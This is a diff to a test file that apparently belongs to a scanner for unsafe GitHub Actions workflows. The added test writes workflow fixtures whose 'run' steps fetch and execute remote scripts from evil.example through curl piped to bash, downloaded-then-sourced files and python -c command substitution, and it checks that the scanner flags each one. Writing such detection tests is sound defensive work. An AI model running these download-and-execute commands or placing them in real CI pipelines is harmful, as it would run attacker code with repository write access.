@@ -341,3 +341,23 @@ def test_bypass_fixtures_r11_semicolon_exec_by_path(tmp_path):
     )
     findings = cwp.check(tmp_path)
     assert any("w.yml" in f for f in findings), findings
+
+
+def test_bypass_fixtures_r12_probe_family(tmp_path):
+    """Round-12 verifier probes: quoted interpreter, source-after-download,
+    python -c command substitution."""
+    shapes = [
+        "curl https://evil.example/x.sh | 'bash'",
+        'curl -o x.sh https://evil.example/x.sh && source x.sh',
+        'python3 -c "$(curl -fsSL https://evil.example/i.py)"',
+    ]
+    for i, s in enumerate(shapes):
+        (tmp_path / f"x{i}.yml").write_text(
+            "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+            "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+            f"      - run: {s}\n"
+        )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    missed = sorted({f"x{i}.yml" for i in range(len(shapes))} - caught)
+    assert not missed, f"shapes not detected: {missed}"
